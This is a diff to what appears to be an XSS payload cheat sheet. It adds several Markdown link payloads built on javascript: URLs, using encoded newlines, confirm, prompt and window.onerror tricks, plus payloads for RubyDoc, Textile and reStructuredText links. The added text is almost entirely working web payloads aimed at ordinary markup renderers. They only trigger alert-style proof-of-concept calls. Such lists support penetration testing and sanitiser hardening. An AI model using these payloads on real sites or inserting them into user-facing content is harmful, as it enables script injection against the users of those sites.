@@ -79,7 +79,41 @@ javas&#x09;cript://www.google.com/%0Aalert(1)
 **Markdown XSS**
 
 ```md
+[a](javascript:confirm(1)
+```
+
+```md
 [a](javascript://www.google.com%0Aprompt(1))
+```
+
+```md
+[a](javascript://%0d%0aconfirm(1);com)
+```
+
+```md
+[a](javascript:window.onerror=confirm;throw%201)
+```
+
+**Lightweight Markup Languages**
+
+**RubyDoc** (.rdoc)
+
+```rdoc
+XSS[JavaScript:alert(1)]
+```
+
+**Textile** (.textile)
+
+```textile
+"Test link":javascript:alert(1)
+```
+
+**reStructuredText** (.rst)
+
+```rst
+`Test link`__.
+
+__ javascript:alert(document.domain)  
 ```
 
 **AngularJS Template Injection based XSS**
